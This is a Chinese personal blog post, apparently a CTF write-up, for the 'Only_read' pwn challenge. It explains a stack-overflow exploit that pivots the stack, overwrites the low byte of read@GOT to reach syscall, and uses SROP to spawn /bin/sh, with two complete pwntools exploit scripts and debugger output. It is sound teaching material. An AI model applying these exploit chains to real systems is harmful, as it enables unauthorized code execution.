@@ -1,0 +1,262 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Only_read | X1z1的个人博客</title><meta name="author" content="xizi"><meta name="copyright" content="xizi"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Only_Read其实这种题型之前已经提供过一种做法了。就是magic_gadget。通过控制rbp和ebx的值，我们可以在没有泄露libc基地址的情况下，getshell。但是，如果当我们连rbp和ebx都控制不了又该怎么办呢？ 在高版本情况下，__libc_csu_init是被删去的。也就是说，我们缺少了很多可以直接控制的寄存器。那么此时在面对只有read函数又该怎么办呢？ https:&#x2F;&#x2F;k">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Only_read">
+<meta property="og:url" content="http://example.com/2026/04/24/Only-read/index.html">
+<meta property="og:site_name" content="X1z1的个人博客">
+<meta property="og:description" content="Only_Read其实这种题型之前已经提供过一种做法了。就是magic_gadget。通过控制rbp和ebx的值，我们可以在没有泄露libc基地址的情况下，getshell。但是，如果当我们连rbp和ebx都控制不了又该怎么办呢？ 在高版本情况下，__libc_csu_init是被删去的。也就是说，我们缺少了很多可以直接控制的寄存器。那么此时在面对只有read函数又该怎么办呢？ https:&#x2F;&#x2F;k">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/avatar.jpg">
+<meta property="article:published_time" content="2026-04-24T15:28:47.000Z">
+<meta property="article:modified_time" content="2026-04-25T04:52:29.333Z">
+<meta property="article:author" content="xizi">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/avatar.jpg"><script type="application/ld+json"></script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2026/04/24/Only-read/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.2"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":400,"highlightFullpage":false,"highlightMacStyle":true},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Only_read',
+  isHighlightShrink: false,
+  isToc: false,
+  pageType: 'posts'
+}</script><link rel="stylesheet" href="/css/_custom/custom.css"><meta name="generator" content="Hexo 6.3.0"></head><body><div class="page" id="body-wrap"><header class="not-home-page" id="page-header" style="background-image: url(/img/bg.jepg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">X1z1的个人博客</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div></div></nav><div id="page-site-info"><h1 id="site-title">Only_read</h1></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="Only-Read"><a href="#Only-Read" class="headerlink" title="Only_Read"></a>Only_Read</h1><p>其实这种题型之前已经提供过一种做法了。就是magic_gadget。通过控制rbp和ebx的值，我们可以在没有泄露libc基地址的情况下，getshell。但是，如果当我们连rbp和ebx都控制不了又该怎么办呢？</p>
+<p>在高版本情况下，<code>__libc_csu_init</code>是被删去的。也就是说，我们缺少了很多可以直接控制的寄存器。那么此时在面对只有read函数又该怎么办呢？</p>
+<p><a target="_blank" rel="noopener" href="https://khighl.github.io/2025/06/13/ACTF%202025/%E8%BF%99%E6%98%AF%E6%88%91%E5%B8%88%E5%82%85%E7%9A%84%E9%93%BE%E6%8E%A5%E3%80%82%E6%88%91%E4%BB%AC%E5%9C%A8%E8%BF%99%E9%87%8C%E5%B0%B1%E5%85%88%E8%AE%A8%E8%AE%BA%E4%B8%80%E7%A7%8D%E5%81%9A%E6%B3%95%EF%BC%8C%E5%90%8E%E9%9D%A2%E7%9A%84%E6%9C%89%E7%A9%BA%E5%86%8D%E8%AF%B4(%E5%92%95%E5%92%95%E5%92%95)">https://khighl.github.io/2025/06/13/ACTF%202025/这是我师傅的链接。我们在这里就先讨论一种做法，后面的有空再说(咕咕咕)</a>….</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE buf[<span class="number">96</span>]; <span class="comment">// [rsp+0h] [rbp-60h] BYREF</span></span><br><span class="line"></span><br><span class="line">  init();</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x400u</span>LL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>保护如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Arch:       amd64-64-little</span><br><span class="line">RELRO:      Partial RELRO</span><br><span class="line">Stack:      No canary found</span><br><span class="line">NX:         NX enabled</span><br><span class="line">PIE:        No PIE (0x3fe000)</span><br><span class="line">SHSTK:      Enabled</span><br><span class="line">IBT:        Enabled</span><br><span class="line">Stripped:   No</span><br></pre></td></tr></table></figure>
+
+<p>整体的C语言从逻辑上来说，是十分简单的。漏洞点也很明显。这里存在相当大量的栈溢出。可是在删除了<code>__libc_csu_init</code>函数的情况下，我们就要另寻蹊径了。</p>
+<h2 id="微量偏移-SROP"><a href="#微量偏移-SROP" class="headerlink" title="微量偏移+SROP"></a>微量偏移+SROP</h2><p>由于只存在read函数。所以我们肯定得从read函数下手。由于ida反汇编里不存在syscall。所以我们当务之急是得先得到syscall的地址。但是我们泄露不出来libc基地址，那怎么得到syscall的地址呢？</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/10i read</span><br><span class="line">   0x7ffff7d1ba80 &lt;read&gt;:	endbr64 </span><br><span class="line">   0x7ffff7d1ba84 &lt;read+4&gt;:	cmp    BYTE PTR [rip+0xef5b5],0x0        # 0x7ffff7e0b040 &lt;__libc_single_threaded&gt;</span><br><span class="line">   0x7ffff7d1ba8b &lt;read+11&gt;:	je     0x7ffff7d1baa0 &lt;read+32&gt;</span><br><span class="line">   0x7ffff7d1ba8d &lt;read+13&gt;:	xor    eax,eax</span><br><span class="line">   0x7ffff7d1ba8f &lt;read+15&gt;:	syscall </span><br><span class="line">   0x7ffff7d1ba91 &lt;read+17&gt;:	cmp    rax,0xfffffffffffff000</span><br><span class="line">   0x7ffff7d1ba97 &lt;read+23&gt;:	ja     0x7ffff7d1bae8 &lt;read+104&gt;</span><br><span class="line">   0x7ffff7d1ba99 &lt;read+25&gt;:	ret    </span><br><span class="line">   0x7ffff7d1ba9a &lt;read+26&gt;:	nop    WORD PTR [rax+rax*1+0x0]</span><br><span class="line">   0x7ffff7d1baa0 &lt;read+32&gt;:	push   rbp</span><br></pre></td></tr></table></figure>
+
+<p>可以看到，这里read函数的内部偏移存在syscall。而且关键的是，和read的地址只差最低一字节。如果我们能把read_buf改成read_got，这样下次去调用read函数的时候，不就是去调用syscall了吗！但是由于这样的操作，所以导致我们调用read读入的机会只有一次。所以我们要提前布局好。而这里也是最困难的一点。</p>
+<p>所以我们大致思路是，通过栈迁移改buf地址为read_got，修改最低字节为syscall的最低字节，得到elf.plt.read&#x3D;sycall，然后去打srop。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.plt.sec:0000000000401050 _read           proc near               ; CODE XREF: main+2C↓p</span><br><span class="line">.plt.sec:0000000000401050 ; __unwind &#123;</span><br><span class="line">.plt.sec:0000000000401050                 endbr64</span><br><span class="line">.plt.sec:0000000000401054                 jmp     cs:off_404000</span><br><span class="line">.plt.sec:0000000000401054 _read           endp</span><br></pre></td></tr></table></figure>
+
+<p>可以看出调用plt是直接jmp到一个地址，也就是read_got地址。这里不会改变任何寄存器的值。所以下次去使用plt的时候，就相当于去调用syscall了。</p>
+<p>通过硬编码得到read_got地址为0x404000。</p>
+<p>下面给出exp。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">leave = <span class="number">0x4011f1</span></span><br><span class="line">bss = <span class="number">0x404070</span> </span><br><span class="line">read = <span class="number">0x4011d1</span></span><br><span class="line">plt = <span class="number">0x401050</span></span><br><span class="line">pl1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x60</span> + p64(bss) + p64(read)</span><br><span class="line">io.send(pl1)</span><br><span class="line"><span class="comment">#success(hex(elf.plt.read))</span></span><br><span class="line">s = SigreturnFrame()</span><br><span class="line">s.rax = <span class="number">0x3b</span></span><br><span class="line">s.rdi = <span class="number">0x404010</span></span><br><span class="line">s.rip = plt</span><br><span class="line">s.rsp = <span class="number">0x404200</span></span><br><span class="line">pl2 = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> <span class="comment">#0x404010</span></span><br><span class="line">pl2 = pl2.ljust(<span class="number">0x50</span>,<span class="string">b&#x27;a&#x27;</span>) <span class="comment">#0x404060</span></span><br><span class="line">pl2 += p64(<span class="number">0x4040c8</span>) + p64(read)</span><br><span class="line">pl2 += p64(<span class="number">0x404060</span>) + p64(read) </span><br><span class="line">pl2 += <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span> </span><br><span class="line">pl2 += p64(<span class="number">0x4040D0</span>) + p64(plt) + <span class="built_in">bytes</span>(s)</span><br><span class="line">gdb.attach(io)</span><br><span class="line">io.send(pl2)</span><br><span class="line">pause()</span><br><span class="line">io.send(<span class="string">b&#x27;\x8f&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line">io.send(p64(<span class="number">0x4011f1</span>)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>这里我们先去栈迁移到0x404070，则rsp即写入位置为0x404010。这样我们写入&#x2F;bin&#x2F;sh\x00，同时也确定了我们rdi的地址。这里的难点是，由于我们的栈布局整体是一次性写出。所以我们需要不断调试。</p>
+<p>我们先直观的看一下，当我们写入了这些数据，bss段被我们修改成了什么样。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; tele 0x404010</span><br><span class="line">00:0000│ rsi 0x404010 (data_start) ◂— 0x68732f6e69622f /* &#x27;/bin/sh&#x27; */</span><br><span class="line">01:0008│-058 0x404018 (__dso_handle) ◂— 0x6161616161616161 (&#x27;aaaaaaaa&#x27;)</span><br><span class="line">... ↓        6 skipped</span><br><span class="line">pwndbg&gt; </span><br><span class="line">08:0040│-020 0x404050 ◂— 0x6161616161616161 (&#x27;aaaaaaaa&#x27;)</span><br><span class="line">09:0048│-018 0x404058 ◂— 0x6161616161616161 (&#x27;aaaaaaaa&#x27;)</span><br><span class="line">0a:0050│-010 0x404060 —▸ 0x4040c8 —▸ 0x4040d0 —▸ 0x401050 ◂— endbr64 </span><br><span class="line">0b:0058│-008 0x404068 —▸ 0x4011d1 (main+22) ◂— lea rax, [rbp - 0x60]</span><br><span class="line">0c:0060│ rbp 0x404070 —▸ 0x404060 —▸ 0x4040c8 —▸ 0x4040d0 —▸ 0x401050 ◂— ...</span><br><span class="line">0d:0068│+008 0x404078 —▸ 0x4011d1 (main+22) ◂— lea rax, [rbp - 0x60]</span><br><span class="line">0e:0070│+010 0x404080 ◂— 0x6161616161616161 (&#x27;aaaaaaaa&#x27;)</span><br><span class="line">0f:0078│+018 0x404088 ◂— 0x6161616161616161 (&#x27;aaaaaaaa&#x27;)</span><br><span class="line">pwndbg&gt; </span><br><span class="line">10:0080│+020 0x404090 ◂— 0x6161616161616161 (&#x27;aaaaaaaa&#x27;)</span><br><span class="line">... ↓     6 skipped</span><br><span class="line">17:00b8│+058 0x4040c8 —▸ 0x4040d0 —▸ 0x401050 ◂— endbr64 </span><br><span class="line">pwndbg&gt; </span><br><span class="line">18:00c0│+060 0x4040d0 —▸ 0x401050 ◂— endbr64 </span><br><span class="line">19:00c8│+068 0x4040d8 ◂— 0</span><br></pre></td></tr></table></figure>
+
+<p>我们可以对比得到0x4040d8是我们srop的起始地址。所以只要我们修改plt为syscall以后，再把栈迁移到0x4040d0，就可以完成我们的劫持了。</p>
+<p>我们来看看被我们劫持的执行流。从倒推的方式，应该更好理解这里栈的布局。</p>
+<p>首先，rsp:0x404010，rbp:0x404070。这样去执行第二次栈迁移，rbp:0x404060，rsp:0x404000，这时，我们去写入了’\x8f’，此时查看got表，可以看到call read被我们成功改写为syscall。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; got</span><br><span class="line">Filtering out read-only entries (display them with -r or --show-readonly)</span><br><span class="line"></span><br><span class="line">State of the GOT of /home/xizi/Desktop/interview/pwn2/pwn:</span><br><span class="line">GOT protection: Partial RELRO | Found 2 GOT entries passing the filter</span><br><span class="line">[0x404000] read@GLIBC_2.2.5 -&gt; 0x7ffff7d1ba8f (read+15) ◂— syscall </span><br><span class="line">[0x404008] setvbuf@GLIBC_2.2.5 -&gt; 0x7ffff7c88550 (setvbuf) ◂— endbr64 </span><br></pre></td></tr></table></figure>
+
+<p>然后执行第三次栈迁移。rbp:0x4040c8，rsp:0x404068，我们向这里写入了15字节的数据，去控制rax&#x3D;15。为我们后续去call syscall做准备。</p>
+<p>现在问题来了。为什么15字节数据是leave+7个垃圾字节，而不是直接15个垃圾字节呢？</p>
+<p>如果不写入leave的话，我们此时程序的rsp会被卡死在0x404070，同时，我们0x404068里会被a所覆盖。那么当我们read读完，执行ret指令的时候，rsp里的值被弹出。是什么呢？是我们8字节的a。此时整个程序卡死。</p>
+<p>所以我们需要给rsp一个合法地址。而且是一个能触发srop的地址。又由于read执行完后ret指令会pop rip。所以此时0x4040d8这个地址的前一个地址0x4040d0，就应该是我们rsp的地址。这样read结束完后，rip执行ret，rsp就是srop的起始地址了。之后就可以成功触发我们的srop了！</p>
+<p>其实总体来说还有个小坑。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">read_got = <span class="number">0x404000</span></span><br><span class="line">read_plt = <span class="number">0x401050</span></span><br><span class="line">read = <span class="number">0x4011D1</span>  </span><br><span class="line">payload1 = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x60</span>         </span><br><span class="line">payload1 += p64(<span class="number">0x404070</span>)      </span><br><span class="line">payload1 += p64(read)  </span><br><span class="line">io.send(payload1)</span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = <span class="number">59</span>                  </span><br><span class="line">frame.rdi = <span class="number">0x404010</span>            </span><br><span class="line">frame.rsi = <span class="number">0</span></span><br><span class="line">frame.rdx = <span class="number">0</span></span><br><span class="line">frame.rip = read_plt            </span><br><span class="line">frame.rsp = <span class="number">0x404090</span>            </span><br><span class="line">payload2 = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">0x50</span>, <span class="string">b&#x27;\x00&#x27;</span>) </span><br><span class="line">payload2 += p64(<span class="number">0x404080</span>)     </span><br><span class="line">payload2 += p64(read)   </span><br><span class="line">payload2 += p64(<span class="number">0x404060</span>)       </span><br><span class="line">payload2 += p64(read)   </span><br><span class="line">payload2 += p64(<span class="number">0x404088</span>)       </span><br><span class="line">payload2 += p64(read_plt)      </span><br><span class="line">payload2 += <span class="built_in">bytes</span>(frame)      </span><br><span class="line">io.send(payload2)</span><br><span class="line">pause()</span><br><span class="line">io.send(<span class="string">b&#x27;\x8f&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line">io.send(<span class="string">b&#x27;B&#x27;</span> * <span class="number">15</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>整体逻辑是一样的。同时这里也可以成功改掉[read_got]&#x3D;syscall。但是关键问题在于ida里read的实现。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"> text:00000000004011BB main            proc near               ; DATA XREF: _start+18↑o</span><br><span class="line">.text:00000000004011BB</span><br><span class="line">.text:00000000004011BB buf             = byte ptr -60h</span><br><span class="line">.text:00000000004011BB</span><br><span class="line">.text:00000000004011BB ; __unwind &#123;</span><br><span class="line">.text:00000000004011BB                 endbr64</span><br><span class="line">.text:00000000004011BF                 push    rbp</span><br><span class="line">.text:00000000004011C0                 mov     rbp, rsp</span><br><span class="line">.text:00000000004011C3                 sub     rsp, 60h</span><br><span class="line">.text:00000000004011C7                 mov     eax, 0</span><br><span class="line">.text:00000000004011CC                 call    init</span><br><span class="line">.text:00000000004011D1                 lea     rax, [rbp+buf]</span><br><span class="line">.text:00000000004011D5                 mov     edx, 400h       ; nbytes</span><br><span class="line">.text:00000000004011DA                 mov     rsi, rax        ; buf</span><br><span class="line">.text:00000000004011DD                 mov     edi, 0          ; fd</span><br><span class="line">.text:00000000004011E2                 mov     eax, 0</span><br><span class="line">.text:00000000004011E7                 call    _read</span><br><span class="line">.text:00000000004011EC                 mov     eax, 0</span><br><span class="line">.text:00000000004011F1                 leave</span><br><span class="line">.text:00000000004011F2                 retn</span><br></pre></td></tr></table></figure>
+
+<p>可以看到，当我们call _read之后，下一条指令会被push进栈，也就是说这里的0x4011ec会被压进栈。而这里是<code>mov eax,0</code>也就是说，我们辛辛苦苦控制的rax&#x3D;15，现在就变成了rax&#x3D;0。那我们做的一切就都没有意义了。</p>
+<p>现在来对比一下两版exp。为什么第一版能打通呢？</p>
+<p>这里就是栈布局的魅力了。</p>
+<p>我们显示确定buf的位置。这里<code>mov rsi,rax</code>，所以rsi的地址确定为0x404068，然后去call _read，那我们的下一条指令被push，也就是<code>0x4011ec</code>，然后rsp的地址刚好在0x404070，这样push后，导致rsp-8，变成了<code>0x404068</code>。而这里刚刚好就是我们buf的起始地点！那我们就可以手动修改了。成功避开了rax置零的危险。简直是太妙了！</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">xizi</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2026/04/24/Only-read/">http://example.com/2026/04/24/Only-read/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://example.com" target="_blank">X1z1的个人博客</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/pwn/">pwn</a></div><div class="post-share"><div class="social-share" data-image="/img/avatar.jpg" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav id="pagination"><div class="pagination"></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2026/03/26/C++%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/" title="C++异常处理"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-03-26</div><div class="info-item-2">C++异常处理</div></div><div class="info-2"><div class="info-item-1">C++异常处理机制misc | Hexo C++ 异常处理是一种在程序运行时处理错误和特殊情况的机制。它允许程序在遇到问题时，通过抛出和捕获异常来转移控制流，而不是使用传统的错误处理方法（如通过函数返回值）。C++ 异常处理主要涉及三个关键字：try、catch和throw。 核心工作机制：栈展开 (Stack Unwinding)这是C++异常机制中最重要的一环。当异常被 throw 抛出，且在当前作用域没有找到匹配的 catch 块时，C++ 运行时会去调用者的作用域中寻找，一直沿着函数调用栈向上找。 在这个“向上找”的过程中，C++ 会自动调用当前作用域内所有已构造的局部对象的析构函数，安全地释放资源。这个过程就叫栈展开。这与 RAII（资源获取即初始化）机制完美配合，防止了内存泄漏。 异常展开机制在把控制权交还给 main 函数时，不仅会设置 RIP，还会从栈上恢复 RBP 寄存器，以恢复 main 函数的栈帧环境。 所以说，如果我们能伪造rbp+8的地址，让它指向一个含有c++异常处理的函数。这样做到可以绕过canary等保护。 [第五空间 2022]toolkit链接...</div></div></div></a><a class="pagination-related" href="/2026/02/07/Hgame2026/" title="Hgame2026"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-02-07</div><div class="info-item-2">Hgame2026</div></div><div class="info-2"><div class="info-item-1">Hgame 2026第一周的Hgame pwn的部分题解。花了一周的大部分时间在写。也确实难度很高。万幸的是还好没爆零。还是需要不断学习的。 1.EZheap真的ez吗？😂快被虐哭了😢其实是自己菜。 123456789101112131415161718192021222324252627282930313233343536int __fastcall main(int argc, const char **argv, const char **envp)&#123;  int choice; // [rsp+4h] [rbp-34h] BYREF  unsigned __int64 v5; // [rsp+8h] [rbp-30h]  v5 = __readfsqword(0x28u);  init();  while ( 1 )  &#123;    menu();    __isoc99_scanf(&quot;%d&quot;, &amp;choice);    switch ( choice )    &#123;      case 1:        add()...</div></div></div></a><a class="pagination-related" href="/2026/03/16/Magic-gadget/" title="Magic_gadget"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-03-16</div><div class="info-item-2">Magic_gadget</div></div><div class="info-2"><div 